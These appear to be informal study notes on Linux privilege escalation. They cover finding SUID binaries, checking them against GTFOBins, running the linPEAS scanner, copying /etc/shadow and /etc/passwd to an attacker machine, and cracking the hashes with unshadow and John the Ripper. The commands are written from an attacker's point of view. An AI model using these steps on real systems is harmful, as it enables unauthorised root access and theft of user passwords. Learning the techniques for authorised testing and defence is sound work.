-->> GAIN ROOT ACCESS OF REMOTE SYSTEM AFTER SETTING UP CONNECTION WITHOUT HAVING ROOT PERMISSION <<--


> find /usr/bin -perm -4000
gives commands with root permission

-> Search for gtfobins on web. Go to its github.io page. Click on SUDO.
-> Check for the commands that matches from the above list(from /usr/bin) with the lsit of commands in gtfobins page(sudo).
-> Try and Exploit the misconfiguration of permissions given to these commands.


* Once we are inside a System of Remote Machine as a Regular User--

To gain root Access through misconfigurations, use linPEAS Shell Script.

-> Copy the first command under Quick Start, '#From Github' to Attacker Terminal.
-> Script runs and Scans whole System for Misconfigurations.
-> After Scan:
	- If 'Can I read shadow files?' is seen(SHADOW file stores Password in encrypted form<crypt>), it means show is having some misconfigurations. 
	- Script can read content of SHADOW and is seen in RED.
	- These passwords can be seen in RED.
	
	- Scrolling above. Under 'Interesting Files', we can find more misconfigured commands represented in RED.
	
	- Try running these commands from Attacker side using root privilages and it will not ask for root password and your Root in Victim's System.
	
	-> To Gain Password from SHADOW file's content(Passwords in Hashed format) :
		- Search for shadow file
		> cd /etc
		> ls shadow
		> ls passwd
		- both these files are present in /etc
		
		- Get these files in Attacker's System,
		- On attacker side-
			> cd /etc
			> get shadow
			> get passwd
			- Downloads both the files from Victim's System
		
		- Crack this Hash Value from Shadow using 'John the Ripper'
			> unshadow passwd shadow > unshadowed.txt	# Combined the 2 files in Single.
			O/P> Created directory: home/kali/.john
			> john --wordlists=rockyou.txt unshadowed.txt --format=crypt	# crypt is format in which Linux encrypts the Passwords.
			- This command cracks the Passwords of users and Root.
